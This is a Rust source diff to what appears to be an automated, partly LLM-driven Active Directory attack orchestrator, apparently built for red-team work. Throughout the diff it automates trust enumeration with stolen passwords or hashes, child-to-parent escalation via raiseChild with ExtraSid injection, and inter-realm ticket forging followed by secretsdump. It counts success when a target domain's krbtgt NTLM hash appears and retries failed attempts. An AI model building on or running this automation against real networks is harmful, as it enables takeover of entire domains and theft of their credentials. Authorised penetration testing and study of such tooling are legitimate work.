@@ -9,12 +9,15 @@
 //! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
 //!    ticket creation and secretsdump against the foreign DC.
 
+use std::collections::HashSet;
 use std::sync::Arc;
 use std::time::Duration;
 
 use serde_json::json;
 use tokio::sync::watch;
 use tracing::{debug, info, warn};
+
+use ares_llm::ToolCall;
 
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
@@ -81,25 +84,38 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 // Two dedup keys per domain:
                 //   trust_enum:<domain> — password-based attempt
                 //   trust_enum_hash:<domain> — hash-based retry (for dominated domains)
-                let enum_work: Vec<(String, String, String)> = state
+                //
+                // Iterate the union of `domain_controllers` keys and
+                // `dominated_domains`. The latter covers the case where a
+                // domain was compromised (e.g. via raise_child to the parent)
+                // but its DC was never explicitly seeded into
+                // `domain_controllers` — without this, parent-DC trust
+                // enumeration would never fire and cross-forest trusts would
+                // remain undiscovered.
+                let mut candidate_domains: HashSet<String> = state
                     .domain_controllers
+                    .keys()
+                    .map(|d| d.to_lowercase())
+                    .collect();
+                for d in state.dominated_domains.iter() {
+                    candidate_domains.insert(d.to_lowercase());
+                }
+                let enum_work: Vec<(String, String, String)> = candidate_domains
                     .iter()
-                    .filter(|(domain, _)| {
-                        let key = trust_enum_dedup_key(domain, false);
-                        let hash_key = trust_enum_dedup_key(domain, true);
-                        !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
-                            || (!state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key)
-                                && state.dominated_domains.contains(&domain.to_lowercase()))
-                    })
-                    .map(|(domain, dc_ip)| {
-                        // Use hash_key if password-based was already tried
+                    .filter_map(|domain| {
+                        let dc_ip = state.resolve_dc_ip(domain)?;
                         let pw_key = trust_enum_dedup_key(domain, false);
-                        let key = if state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key) {
-                            trust_enum_dedup_key(domain, true)
-                        } else {
-                            pw_key
-                        };
-                        (key, domain.clone(), dc_ip.clone())
+                        let hash_key = trust_enum_dedup_key(domain, true);
+                        let pw_done = state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key);
+                        let hash_done = state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key);
+                        let dominated = state.dominated_domains.contains(domain);
+                        // Skip if password attempt is done AND (no hash retry
+                        // applies, or hash retry already done).
+                        if pw_done && (!dominated || hash_done) {
+                            return None;
+                        }
+                        let key = if pw_done { hash_key } else { pw_key };
+                        Some((key, domain.clone(), dc_ip))
                     })
                     .collect();
                 drop(state);
@@ -164,39 +180,138 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     };
 
                     if let Some(cred_json) = cred_payload {
-                        let payload = json!({
-                            "techniques": ["enumerate_domain_trusts"],
-                            "target_ip": dc_ip,
+                        // Direct tool dispatch — bypass the LLM agent loop.
+                        // The recon prompt template did not surface
+                        // `credential.hash` (only password), so LLM-driven trust
+                        // enumeration with hash auth would render an empty
+                        // password and fail with LDAP 52e. The orchestrator
+                        // already owns every input here; deliver them directly
+                        // to enumerate_domain_trusts via dispatch_tool.
+                        let mut args = json!({
+                            "target": dc_ip,
                             "domain": domain,
-                            "credential": cred_json,
+                            "username": cred_json
+                                .get("username")
+                                .and_then(|v| v.as_str())
+                                .unwrap_or(""),
                         });
-
-                        match dispatcher
-                            .throttled_submit("recon", "recon", payload, 3)
-                            .await
+                        if let Some(p) = cred_json
+                            .get("password")
+                            .and_then(|v| v.as_str())
+                            .filter(|s| !s.is_empty())
                         {
-                            Ok(Some(task_id)) => {
-                                info!(
-                                    task_id = %task_id,
-                                    domain = %domain,
-                                    auth = auth_method,
-                                    "Trust enumeration dispatched"
-                                );
-                                dispatcher
+                            args["password"] = json!(p);
+                        }
+                        if let Some(h) = cred_json
+                            .get("hash")
+                            .and_then(|v| v.as_str())
+                            .filter(|s| !s.is_empty())
+                        {
+                            args["hash"] = json!(h);
+                        }
+                        if let Some(bd) = cred_json
+                            .get("domain")
+                            .and_then(|v| v.as_str())
+                            .filter(|s| !s.is_empty() && !s.eq_ignore_ascii_case(&domain))
+                        {
+                            args["bind_domain"] = json!(bd);
+                        }
+
+                        let call = ToolCall {
+                            id: format!("trust_enum_{}", uuid::Uuid::new_v4().simple()),
+                            name: "enumerate_domain_trusts".to_string(),
+                            arguments: args,
+                        };
+                        let task_id = format!(
+                            "trust_enum_{}",
+                            &uuid::Uuid::new_v4().simple().to_string()[..12]
+                        );
+
+                        // Mark dedup BEFORE spawn so the next 30s tick doesn't
+                        // re-dispatch while enumeration is in flight.
+                        dispatcher
+                            .state
+                            .write()
+                            .await
+                            .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+                        let _ = dispatcher
+                            .state
+                            .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                            .await;
+
+                        info!(
+                            task_id = %task_id,
+                            domain = %domain,
+                            dc_ip = %dc_ip,
+                            auth = auth_method,
+                            "Dispatching enumerate_domain_trusts (direct tool, no LLM)"
+                        );
+
+                        let dispatcher_bg = dispatcher.clone();
+                        let domain_bg = domain.clone();
+                        let key_bg = key.clone();
+                        tokio::spawn(async move {
+                            let result = dispatcher_bg
+                                .llm_runner
+                                .tool_dispatcher()
+                                .dispatch_tool("recon", &task_id, &call)
+                                .await;
+                            // On any failure (tool error or dispatch error),
+                            // clear the dedup so the next 30s tick can retry
+                            // — typically with a freshly discovered credential
+                            // for the target domain. The original cred chosen
+                            // here may have been a sibling-domain match (via
+                            // is_domain_related) that fails LDAP bind 52e
+                            // against a parent/foreign DC.
+                            let clear_dedup = || async {
+                                dispatcher_bg
                                     .state
                                     .write()
                                     .await
-                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
-                                let _ = dispatcher
+                                    .unmark_processed(DEDUP_TRUST_FOLLOW, &key_bg);
+                                let _ = dispatcher_bg
                                     .state
-                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                                    .unpersist_dedup(
+                                        &dispatcher_bg.queue,
+                                        DEDUP_TRUST_FOLLOW,
+                                        &key_bg,
+                                    )
                                     .await;
+                            };
+                            match result {
+                                Ok(exec_result) => {
+                                    if let Some(err) = exec_result.error.as_ref() {
+                                        warn!(
+                                            err = %err,
+                                            domain = %domain_bg,
+                                            "enumerate_domain_trusts returned error — clearing dedup for retry"
+                                        );
+                                        clear_dedup().await;
+                                        return;
+                                    }
+                                    let trust_count = exec_result
+                                        .discoveries
+                                        .as_ref()
+                                        .and_then(|d| d.get("trusted_domains"))
+                                        .and_then(|t| t.as_array())
+                                        .map(|a| a.len())
+                                        .unwrap_or(0);
+                                    info!(
+                                        domain = %domain_bg,
+                                        trust_count = trust_count,
+                                        "enumerate_domain_trusts completed"
+                                    );
+                                }
+                                Err(e) => {
+                                    warn!(
+                                        err = %e,
+                                        domain = %domain_bg,
+                                        "enumerate_domain_trusts dispatch errored — clearing dedup for retry"
+                                    );
+                                    clear_dedup().await;
+                                }
                             }
-                            Ok(None) => {
-                                debug!(domain = %domain, "Trust enum throttled — deferred");
-                            }
-                            Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
-                        }
+                        });
                     }
                 }
             }
@@ -575,73 +690,206 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         continue;
                     }
 
-                    // Convert child-to-parent escalation to deterministic task like
-                    // cross-forest forge: run generate_golden_ticket + secretsdump_kerberos
-                    // sequentially on the worker without LLM parameter laundering.
-                    let mut golden_payload = json!({
-                        "techniques": ["generate_golden_ticket", "secretsdump_kerberos"],
-                        "vuln_type": "child_to_parent",
-                        "vuln_id": &vuln_id,
+                    // Use raiseChild.py (impacket's canonical child→parent ExtraSid
+                    // automation) via DIRECT tool dispatch (no LLM in the loop).
+                    // This replaces the previous golden_ticket + secretsdump_kerberos
+                    // combo, which fails because impacket's cross-realm referral is
+                    // broken (fortra/impacket#315): a child-realm ticket presented
+                    // to the parent KDC returns KDC_ERR_WRONG_REALM /
+                    // KDC_ERR_PREAUTH_FAILED. raiseChild forges the inter-realm
+                    // chain internally and dumps parent krbtgt + Administrator in
+                    // one shot.
+                    //
+                    // Direct dispatch_tool bypasses the LLM agent loop entirely —
+                    // the orchestrator owns every input (child admin hash, child
+                    // DC IP, parent DC IP), so there is no value in laundering them
+                    // through an LLM that might typo or omit args.
+                    let admin_hash_value = child_admin_hash.as_ref().map(|h| h.hash_value.clone());
+                    let admin_password = child_admin_cred
+                        .as_ref()
+                        .map(|c| c.password.clone())
+                        .filter(|p| !p.is_empty());
+                    if admin_hash_value.is_none() && admin_password.is_none() {
+                        warn!(
+                            child_domain = %child_domain,
+                            parent_domain = %parent_domain,
+                            "No child Administrator hash or password — deferring child-to-parent (raise_child needs auth)"
+                        );
+                        continue;
+                    }
 
-                        // generate_golden_ticket args
-                        "domain": child_domain,
-                        "username": "Administrator", // RID-500 name, resolved from state
-                        "ticket_path": "Administrator.ccache",
-
-                        // secretsdump_kerberos args
-                        "target": parent_dc_ip.as_str(), // parent DC hostname if available
-                        "target_ip": &parent_dc_ip,
-                        "domain": parent_domain,
-                        "dc_ip": &parent_dc_ip,
+                    // raiseChild auto-discovers parent forest root via the
+                    // child DC's trustedDomain LDAP objects and resolves DC IPs
+                    // via DNS — extra IP/domain flags are not supported and
+                    // make argparse exit 2.
+                    let mut raise_args = json!({
+                        "child_domain": child_domain.clone(),
+                        "username": "Administrator",
                     });
-
-                    // Add resolved SIDs
-                    if let Some(source_sid) = payload.get("source_sid") {
-                        golden_payload["domain_sid"] = source_sid.clone();
+                    if let Some(h) = admin_hash_value {
+                        raise_args["hash"] = json!(h);
+                    } else if let Some(p) = admin_password {
+                        raise_args["password"] = json!(p);
                     }
-                    if let Some(target_sid) = payload.get("target_sid") {
-                        golden_payload["extra_sid"] =
-                            json!(format!("{}-519", target_sid.as_str().unwrap_or("")));
-                    }
+                    let _ = (&child_dc_ip, &parent_dc_ip);
 
-                    // Add child krbtgt hash if available
-                    if let Some(krbtgt_hash) = payload.get("child_krbtgt_hash") {
-                        golden_payload["krbtgt_hash"] = krbtgt_hash.clone();
-                    }
+                    let call = ToolCall {
+                        id: format!("raise_child_{}", uuid::Uuid::new_v4().simple()),
+                        name: "raise_child".to_string(),
+                        arguments: raise_args,
+                    };
+                    let task_id = format!(
+                        "trust_raise_child_{}",
+                        &uuid::Uuid::new_v4().simple().to_string()[..12]
+                    );
 
-                    match dispatcher
-                        .throttled_submit("credential_access", "privesc", golden_payload, 1)
+                    // Mark dedup BEFORE spawning so the next 30s tick doesn't
+                    // re-dispatch the same trust while raiseChild is running.
+                    dispatcher
+                        .state
+                        .write()
                         .await
-                    {
-                        Ok(Some(task_id)) => {
-                            info!(
-                                task_id = %task_id,
-                                child_domain = %child_domain,
-                                parent_domain = %parent_domain,
-                                auth = auth_method,
-                                "Child-to-parent escalation dispatched (deterministic ExtraSid golden ticket, no LLM)"
-                            );
-                            let _ = dispatcher
-                                .state
-                                .mark_exploited(&dispatcher.queue, &vuln_id)
-                                .await;
-                            dispatcher
-                                .state
-                                .write()
-                                .await
-                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
-                            let _ = dispatcher
-                                .state
-                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
-                                .await;
+                        .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                        .await;
+
+                    info!(
+                        task_id = %task_id,
+                        child_domain = %child_domain,
+                        parent_domain = %parent_domain,
+                        auth = auth_method,
+                        "Dispatching raise_child (direct tool, no LLM)"
+                    );
+
+                    // Spawn so the trust loop continues processing other items
+                    // while raiseChild runs (typically 30–120s). mark_exploited
+                    // is gated on observed parent krbtgt — no premature marking.
+                    let dispatcher_bg = dispatcher.clone();
+                    let parent_domain_bg = parent_domain.clone();
+                    let child_domain_bg = child_domain.clone();
+                    let vuln_id_bg = vuln_id.clone();
+                    tokio::spawn(async move {
+                        let result = dispatcher_bg
+                            .llm_runner
+                            .tool_dispatcher()
+                            .dispatch_tool("privesc", &task_id, &call)
+                            .await;
+                        match result {
+                            Ok(exec_result) => {
+                                if let Some(err) = exec_result.error.as_ref() {
+                                    let tail: String = exec_result
+                                        .output
+                                        .chars()
+                                        .rev()
+                                        .take(2000)
+                                        .collect::<String>()
+                                        .chars()
+                                        .rev()
+                                        .collect();
+                                    warn!(
+                                        err = %err,
+                                        child_domain = %child_domain_bg,
+                                        parent_domain = %parent_domain_bg,
+                                        output_tail = %tail,
+                                        "raise_child returned error"
+                                    );
+                                    return;
+                                }
+                                // Verify parent compromise — only mark exploited
+                                // when we actually observe parent krbtgt.
+                                //
+                                // Inspect exec_result.discoveries directly:
+                                // dispatch_tool returns BEFORE push_realtime_discoveries
+                                // finishes pumping hashes into state.hashes, so reading
+                                // state here is too early and produces a false negative.
+                                let parent_lower = parent_domain_bg.to_lowercase();
+                                let has_parent_krbtgt = exec_result
+                                    .discoveries
+                                    .as_ref()
+                                    .and_then(|d| d.get("hashes"))
+                                    .and_then(|h| h.as_array())
+                                    .map(|hashes| {
+                                        hashes.iter().any(|h| {
+                                            let user = h
+                                                .get("username")
+                                                .and_then(|v| v.as_str())
+                                                .unwrap_or("");
+                                            let dom = h
+                                                .get("domain")
+                                                .and_then(|v| v.as_str())
+                                                .unwrap_or("");
+                                            let htype = h
+                                                .get("hash_type")
+                                                .and_then(|v| v.as_str())
+                                                .unwrap_or("");
+                                            user.eq_ignore_ascii_case("krbtgt")
+                                                && dom.to_lowercase() == parent_lower
+                                                && htype.eq_ignore_ascii_case("ntlm")
+                                        })
+                                    })
+                                    .unwrap_or(false);
+                                let tail_for_log: String = exec_result
+                                    .output
+                                    .chars()
+                                    .rev()
+                                    .take(2000)
+                                    .collect::<String>()
+                                    .chars()
+                                    .rev()
+                                    .collect();
+                                if has_parent_krbtgt {
+                                    info!(
+                                        parent_domain = %parent_domain_bg,
+                                        "raise_child compromised parent — marking exploited"
+                                    );
+                                    let _ = dispatcher_bg
+                                        .state
+                                        .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
+                                        .await;
+                                    let techniques =
+                                        vec!["T1134.005".to_string(), "T1003.006".to_string()];
+                                    let event_id = format!(
+                                        "evt-raise-child-{}",
+                                        &uuid::Uuid::new_v4().simple().to_string()[..8]
+                                    );
+                                    let event = serde_json::json!({
+                                        "id": event_id,
+                                        "timestamp": chrono::Utc::now().to_rfc3339(),
+                                        "source": "trust_automation",
+                                        "description": format!(
+                                            "Child-to-parent ExtraSid escalation: {} \u{2192} {} via raiseChild",
+                                            child_domain_bg, parent_domain_bg
+                                        ),
+                                        "mitre_techniques": techniques,
+                                    });
+                                    let _ = dispatcher_bg
+                                        .state
+                                        .persist_timeline_event(
+                                            &dispatcher_bg.queue,
+                                            &event,
+                                            &techniques,
+                                        )
+                                        .await;
+                                } else {
+                                    warn!(
+                                        parent_domain = %parent_domain_bg,
+                                        output_tail = %tail_for_log,
+                                        "raise_child completed but no parent krbtgt observed — NOT marking exploited"
+                                    );
+                                }
+                            }
+                            Err(e) => {
+                                warn!(
+                                    err = %e,
+                                    child_domain = %child_domain_bg,
+                                    parent_domain = %parent_domain_bg,
+                                    "raise_child dispatch errored"
+                                );
+                            }
                         }
-                        Ok(None) => {
-                            debug!("Child-to-parent deferred by throttler");
-                        }
-                        Err(e) => {
-                            warn!(err = %e, "Failed to dispatch child-to-parent escalation")
-                        }
-                    }
+                    });
                 }
             }
         }
@@ -1088,93 +1336,65 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 continue;
             }
 
-            let mut ticket_payload = json!({
-                "techniques": ["create_inter_realm_ticket", "secretsdump_kerberos"],
-                "vuln_type": "cross_forest",
-                "vuln_id": &vuln_id,
-
-                // create_inter_realm_ticket args
+            // Build args for the combined `forge_inter_realm_and_dump` tool.
+            // This single tool runs impacket-ticketer + impacket-secretsdump
+            // sequentially in one worker invocation (shared tempdir as cwd),
+            // so the .ccache produced by ticketer is on the same filesystem
+            // when secretsdump reads it. Two split dispatch_tool calls would
+            // land on different worker pods with no shared FS.
+            let mut tool_args = json!({
                 "source_domain": &item.source_domain,
                 "target_domain": &item.target_domain,
                 "trust_key": &item.hash.hash_value,
-                "trust_account": &item.hash.username,
                 "username": ticket_username,
-
-                // secretsdump_kerberos args (target = hostname so Kerberos SPN
-                // validation works; target_ip = routable IP for impacket)
+                // `target` is the DC hostname (or IP fallback) for the SPN
+                // baked into the ticket; `dc_ip` is the routable IP used
+                // for impacket-secretsdump's `-dc-ip`.
                 "target": &target_dc_hostname,
-                "target_ip": &target_dc_ip,
-                "domain": &item.target_domain,
-                "ticket_path": &ticket_path,
                 "dc_ip": &target_dc_ip,
             });
             if let Some(ref sid) = source_domain_sid {
-                ticket_payload["source_sid"] = json!(sid);
+                tool_args["source_sid"] = json!(sid);
             }
             if let Some(ref sid) = item.target_domain_sid {
-                ticket_payload["target_sid"] = json!(sid);
+                tool_args["target_sid"] = json!(sid);
             }
             // AES256 trust key — required for Win2016+ target DCs which
             // reject RC4-only inter-realm tickets with KDC_ERR_TGT_REVOKED.
             if let Some(ref aes) = item.hash.aes_key {
-                ticket_payload["aes_key"] = json!(aes);
+                tool_args["aes_key"] = json!(aes);
             }
-
-            // Submit under credential_access task_type so the worker's
-            // expand_technique_task runs both tools deterministically with
-            // the orchestrator-supplied args. No LLM agent involved.
-            match dispatcher
-                .throttled_submit("credential_access", "privesc", ticket_payload, 1)
-                .await
-            {
-                Ok(Some(task_id)) => {
-                    info!(
-                        task_id = %task_id,
-                        trust_account = %item.hash.username,
-                        source_domain = %item.source_domain,
-                        target_domain = %item.target_domain,
-                        has_source_sid = item.source_domain_sid.is_some(),
-                        has_target_sid = item.target_domain_sid.is_some(),
-                        has_aes = item.hash.aes_key.is_some(),
-                        "Cross-forest forge-and-present dispatched (deterministic, no LLM)"
-                    );
-                    let _ = dispatcher
-                        .state
-                        .mark_exploited(&dispatcher.queue, &vuln_id)
-                        .await;
-
-                    // Emit attack path timeline event for forest trust escalation
-                    let techniques = vec!["T1134.005".to_string(), "T1550.003".to_string()];
-                    let event_id = format!(
-                        "evt-trust-{}",
-                        &uuid::Uuid::new_v4().simple().to_string()[..8]
-                    );
-                    let event = serde_json::json!({
-                        "id": event_id,
-                        "timestamp": chrono::Utc::now().to_rfc3339(),
-                        "source": "trust_automation",
-                        "description": format!(
-                            "Forest trust escalation: {} \u{2192} {} via trust key {}",
-                            item.source_domain, item.target_domain, item.hash.username
-                        ),
-                        "mitre_techniques": techniques,
-                    });
-                    let _ = dispatcher
-                        .state
-                        .persist_timeline_event(&dispatcher.queue, &event, &techniques)
-                        .await;
-                }
-                Ok(None) => {
-                    debug!("Cross-forest forge deferred by throttler");
-                    continue;
-                }
-                Err(e) => {
-                    warn!(err = %e, "Failed to dispatch cross-forest forge");
-                    continue;
+            // For child→parent trusts (intra-forest), inject parent's
+            // Enterprise Admins SID (RID 519) into the forged ticket so
+            // DRSUAPI accepts the request at the parent DC. Without this,
+            // the parent rejects the forged Administrator with access
+            // denied because the ticket only carries child SIDs.
+            // SID filtering blocks ExtraSID injection across forest trusts,
+            // so only emit it when source is a sub-domain of target.
+            let source_l = item.source_domain.to_lowercase();
+            let target_l = item.target_domain.to_lowercase();
+            let is_child_to_parent =
+                source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
+            if is_child_to_parent {
+                if let Some(ref tsid) = item.target_domain_sid {
+                    tool_args["extra_sid"] = json!(format!("{tsid}-519"));
                 }
             }
+            let _ = ticket_path; // ccache path is internal to the tool
+            let _ = trust_target;
 
-            // Mark as processed
+            let call = ToolCall {
+                id: format!("forge_inter_realm_{}", uuid::Uuid::new_v4().simple()),
+                name: "forge_inter_realm_and_dump".to_string(),
+                arguments: tool_args,
+            };
+            let task_id = format!(
+                "trust_forge_{}",
+                &uuid::Uuid::new_v4().simple().to_string()[..12]
+            );
+
+            // Mark dedup BEFORE spawning so the next 30s tick doesn't
+            // re-dispatch the same trust while the forge is running.
             dispatcher
                 .state
                 .write()
@@ -1184,6 +1404,138 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 .state
                 .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                 .await;
+
+            info!(
+                task_id = %task_id,
+                trust_account = %item.hash.username,
+                source_domain = %item.source_domain,
+                target_domain = %item.target_domain,
+                has_source_sid = source_domain_sid.is_some(),
+                has_target_sid = item.target_domain_sid.is_some(),
+                has_aes = item.hash.aes_key.is_some(),
+                "Cross-forest forge dispatched (direct tool, no LLM)"
+            );
+
+            let dispatcher_bg = dispatcher.clone();
+            let source_domain_bg = item.source_domain.clone();
+            let target_domain_bg = item.target_domain.clone();
+            let trust_account_bg = item.hash.username.clone();
+            let vuln_id_bg = vuln_id.clone();
+            let dedup_key_bg = item.dedup_key.clone();
+            tokio::spawn(async move {
+                let result = dispatcher_bg
+                    .llm_runner
+                    .tool_dispatcher()
+                    .dispatch_tool("privesc", &task_id, &call)
+                    .await;
+                // Clear dedup on failure so the next 30s tick can retry once
+                // a fresh trust key, AES key, or SID becomes available.
+                let clear_dedup = || async {
+                    dispatcher_bg
+                        .state
+                        .write()
+                        .await
+                        .unmark_processed(DEDUP_TRUST_FOLLOW, &dedup_key_bg);
+                    let _ = dispatcher_bg
+                        .state
+                        .unpersist_dedup(&dispatcher_bg.queue, DEDUP_TRUST_FOLLOW, &dedup_key_bg)
+                        .await;
+                };
+                match result {
+                    Ok(exec_result) => {
+                        if let Some(err) = exec_result.error.as_ref() {
+                            let tail: String = exec_result
+                                .output
+                                .chars()
+                                .rev()
+                                .take(2000)
+                                .collect::<String>()
+                                .chars()
+                                .rev()
+                                .collect();
+                            warn!(
+                                err = %err,
+                                source_domain = %source_domain_bg,
+                                target_domain = %target_domain_bg,
+                                trust_account = %trust_account_bg,
+                                output_tail = %tail,
+                                "forge_inter_realm_and_dump returned error — clearing dedup for retry"
+                            );
+                            clear_dedup().await;
+                            return;
+                        }
+                        // Verify target compromise — only mark exploited
+                        // when we actually observe the target krbtgt hash
+                        // in the dispatch_tool discoveries.
+                        let target_lower = target_domain_bg.to_lowercase();
+                        let has_target_krbtgt = exec_result
+                            .discoveries
+                            .as_ref()
+                            .and_then(|d| d.get("hashes"))
+                            .and_then(|h| h.as_array())
+                            .map(|hashes| {
+                                hashes.iter().any(|h| {
+                                    let user =
+                                        h.get("username").and_then(|v| v.as_str()).unwrap_or("");
+                                    let dom =
+                                        h.get("domain").and_then(|v| v.as_str()).unwrap_or("");
+                                    let htype =
+                                        h.get("hash_type").and_then(|v| v.as_str()).unwrap_or("");
+                                    user.eq_ignore_ascii_case("krbtgt")
+                                        && dom.to_lowercase() == target_lower
+                                        && htype.eq_ignore_ascii_case("ntlm")
+                                })
+                            })
+                            .unwrap_or(false);
+                        if has_target_krbtgt {
+                            info!(
+                                source_domain = %source_domain_bg,
+                                target_domain = %target_domain_bg,
+                                "Cross-forest forge compromised target — marking exploited"
+                            );
+                            let _ = dispatcher_bg
+                                .state
+                                .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
+                                .await;
+                            let techniques = vec!["T1134.005".to_string(), "T1550.003".to_string()];
+                            let event_id = format!(
+                                "evt-trust-{}",
+                                &uuid::Uuid::new_v4().simple().to_string()[..8]
+                            );
+                            let event = serde_json::json!({
+                                "id": event_id,
+                                "timestamp": chrono::Utc::now().to_rfc3339(),
+                                "source": "trust_automation",
+                                "description": format!(
+                                    "Forest trust escalation: {} \u{2192} {} via trust key {}",
+                                    source_domain_bg, target_domain_bg, trust_account_bg
+                                ),
+                                "mitre_techniques": techniques,
+                            });
+                            let _ = dispatcher_bg
+                                .state
+                                .persist_timeline_event(&dispatcher_bg.queue, &event, &techniques)
+                                .await;
+                        } else {
+                            warn!(
+                                source_domain = %source_domain_bg,
+                                target_domain = %target_domain_bg,
+                                "forge_inter_realm_and_dump completed but no target krbtgt observed — clearing dedup for retry"
+                            );
+                            clear_dedup().await;
+                        }
+                    }
+                    Err(e) => {
+                        warn!(
+                            err = %e,
+                            source_domain = %source_domain_bg,
+                            target_domain = %target_domain_bg,
+                            "forge_inter_realm_and_dump dispatch errored — clearing dedup for retry"
+                        );
+                        clear_dedup().await;
+                    }
+                }
+            });
         }
     }
 }
